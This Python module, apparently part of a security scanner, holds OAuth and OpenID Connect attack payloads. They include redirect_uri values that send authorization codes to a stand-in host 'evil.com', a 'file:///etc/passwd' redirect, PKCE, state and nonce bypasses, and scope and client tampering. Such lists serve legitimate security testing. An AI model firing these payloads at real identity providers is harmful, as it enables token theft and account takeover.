"""
OAuth 2.0 / OpenID Connect Payloads

Payloads for OAuth and OpenID Connect attacks including:
- Redirect URI manipulation
- State parameter bypass
- Token leakage
- PKCE bypass
- Client impersonation
"""

# OAuth redirect URI manipulation
OAUTH_REDIRECT_URI = [
    {
        "name": "evil_redirect",
        "payload": {"redirect_uri": "http://evil.com/callback"},
        "description": "Evil redirect URI",
    },
    {
        "name": "redirect_uri_bypass",
        "payload": {"redirect_uri": "http://target.com/auth?redirect=http://evil.com"},
        "description": "Redirect chaining attack",
    },
    {
        "name": "http_redirect",
        "payload": {"redirect_uri": "http://evil.com/callback"},  # Using http instead of https
        "description": "HTTP redirect URI (no TLS)",
    },
    {
        "name": "open_redirect",
        "payload": {"redirect_uri": ""},  # Open redirect
        "description": "Open redirect URI",
    },
    {
        "name": "localhost_redirect",
        "payload": {"redirect_uri": "http://127.0.0.1:8080/callback"},
        "description": "Localhost redirect",
    },
    {
        "name": "file_redirect",
        "payload": {"redirect_uri": "file:///etc/passwd"},
        "description": "File protocol redirect",
    },
]

# OAuth state parameter attacks
OAUTH_STATE = [
    {
        "name": "state_bypass",
        "payload": {"state": "bypass"},
        "description": "State parameter bypass",
    },
    {
        "name": "state_null",
        "payload": {"state": "null"},
        "description": "Null state parameter",
    },
    {
        "name": "state_manipulation",
        "payload": {"state": "attacker_state"},
        "description": "State manipulation attack",
    },
    {
        "name": "state_csrf",
        "payload": {"state": "evil_state_value"},
        "description": "State parameter CSRF",
    },
]

# OAuth token attacks
OAUTH_TOKEN = [
    {
        "name": "token_leak_fragment",
        "payload": {"redirect_uri": "http://target.com#access_token=leaked_token"},
        "description": "Token leakage via fragment",
    },
    {
        "name": "access_token_override",
        "payload": {"access_token": "attacker_token"},
        "description": "Access token override",
    },
    {
        "name": "code_reuse",
        "payload": {"code": "reused_code"},
        "description": "Authorization code reuse",
    },
    {
        "name": "refresh_token_theft",
        "payload": {"refresh_token": "stolen_refresh_token"},
        "description": "Refresh token theft",
    },
]

# OAuth PKCE bypass
OAUTH_PKCE = [
    {
        "name": "code_challenge_bypass",
        "payload": {"code_challenge": ""},
        "description": "PKCE code challenge bypass",
    },
    {
        "name": "code_challenge_method_bypass",
        "payload": {"code_challenge_method": "plain"},
        "description": "PKCE plain method bypass",
    },
    {
        "name": "code_verifier_bypass",
        "payload": {"code_verifier": ""},  # Empty verifier
        "description": "PKCE code verifier bypass",
    },
    {
        "name": "weak_code_verifier",
        "payload": {"code_verifier": "weak_verifier"},
        "description": "Weak PKCE code verifier",
    },
]

# OAuth client impersonation
OAUTH_CLIENT_IMPERSONATION = [
    {
        "name": "client_id_theft",
        "payload": {"client_id": "attacker_client_id"},
        "description": "Client ID impersonation",
    },
    {
        "name": "client_secret_bypass",
        "payload": {"client_secret": ""},
        "description": "Client secret bypass",
    },
    {
        "name": "redirect_uri_registration",
        "payload": {"client_registration": {"redirect_uris": ["http://evil.com"]}},
        "description": "Dynamic client registration attack",
    },
]

# OpenID Connect specific attacks
OPENID_ATTACKS = [
    {
        "name": "response_mode_fragment",
        "payload": {"response_mode": "fragment"},
        "description": "Fragment response mode (token leakage)",
    },
    {
        "name": "response_mode_query",
        "payload": {"response_mode": "query"},
        "description": "Query response mode bypass",
    },
    {
        "name": "nonce_bypass",
        "payload": {"nonce": ""},
        "description": "Nonce parameter bypass",
    },
    {
        "name": "prompt_none",
        "payload": {"prompt": "none"},
        "description": "Prompt none (silent auth)",
    },
    {
        "name": "display_none",
        "payload": {"display": "none"},
        "description": "Display none (silent auth)",
    },
]

# OAuth scope manipulation
OAUTH_SCOPE = [
    {
        "name": "scope_broadening",
        "payload": {"scope": "openid profile email address"},  # Broad scope
        "description": "Scope broadening attack",
    },
    {
        "name": "scope_override",
        "payload": {"scope": "admin"},
        "description": "Admin scope override",
    },
    {
        "name": "scope_bypass",
        "payload": {"scope": ""},
        "description": "Scope parameter bypass",
    },
]

# OAuth response_type manipulation
OAUTH_RESPONSE_TYPE = [
    {
        "name": "response_type_token",
        "payload": {"response_type": "token"},  # Implicit flow
        "description": "Implicit flow (token in fragment)",
    },
    {
        "name": "response_type_id_token",
        "payload": {"response_type": "id_token"},
        "description": "ID token response type",
    },
    {
        "name": "response_type_none",
        "payload": {"response_type": "none"},
        "description": "None response type",
    },
]

# OAuth grant_type manipulation
OAUTH_GRANT_TYPE = [
    {
        "name": "grant_type_password",
        "payload": {"grant_type": "password"},
        "description": "Resource Owner Password grant",
    },
    {
        "name": "grant_type_client_credentials",
        "payload": {"grant_type": "client_credentials"},
        "description": "Client Credentials grant",
    },
    {
        "name": "grant_type_implicit",
        "payload": {"grant_type": "implicit"},
        "description": "Implicit grant bypass",
    },
]

# OAuth vulnerability indicators
OAUTH_VULN_INDICATORS = [
    "Open redirect allowed",
    "HTTP redirect URI accepted",
    "State parameter not validated",
    "PKCE not enforced",
    "Token in fragment",
    "Scope not validated",
    "Client ID not validated",
    "redirect_uri accepts evil.com",
]

# Common OAuth parameters
OAUTH_PARAMETERS = [
    "client_id",
    "client_secret",
    "redirect_uri",
    "scope",
    "state",
    "response_type",
    "grant_type",
    "code_challenge",
    "code_verifier",
    "nonce",
    "prompt",
    "display",
    "login_hint",
    "max_age",
    "ui_locales",
    "acr_values",
]
